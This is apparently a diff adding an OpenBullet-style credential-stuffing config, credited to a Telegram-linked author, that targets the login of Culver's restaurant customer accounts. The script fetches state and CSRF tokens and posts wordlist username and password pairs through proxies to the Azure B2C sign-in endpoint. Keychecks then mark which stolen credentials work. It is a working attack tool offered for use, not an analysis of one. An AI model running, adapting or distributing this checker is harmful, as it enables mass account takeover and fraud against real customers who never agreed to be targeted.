@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "Culver's(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-01T17:31:32.9818976+01:00",
+  "AdditionalInfo": "https://t.me/wolfconfigs",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.culvers.com/Account/Login" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<HEADERS(Location)>" LR "" "" -> VAR "e" 
+
+REQUEST GET "<e>" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<HEADERS(Location)>" LR "" "" -> VAR "c" 
+
+REQUEST GET "<c>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "StateProperties=" "\"," -> VAR "state" 
+
+PARSE "<SOURCE>" LR "\"csrf\": \"" "\"," -> VAR "csrf" 
+
+REQUEST POST "https://culversonline.b2clogin.com/culversonline.onmicrosoft.com/B2C_1A_MyCulvers_SignUpOrSignIn/SelfAsserted?tx=StateProperties=<state>&p=B2C_1A_MyCulvers_SignUpOrSignIn" 
+  CONTENT "request_type=RESPONSE&signInName=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,ro-RO;q=0.8,ro;q=0.7" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: culversonline.b2clogin.com" 
+  HEADER "Origin: https://culversonline.b2clogin.com" 
+  HEADER "Referer: <c>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
+  HEADER "X-CSRF-TOKEN: <csrf>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "200" 
+  KEYCHAIN Failure OR 
+    KEY "Your email address or password is incorrect" 
+    KEY "An account could not be found for the provided user ID." 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
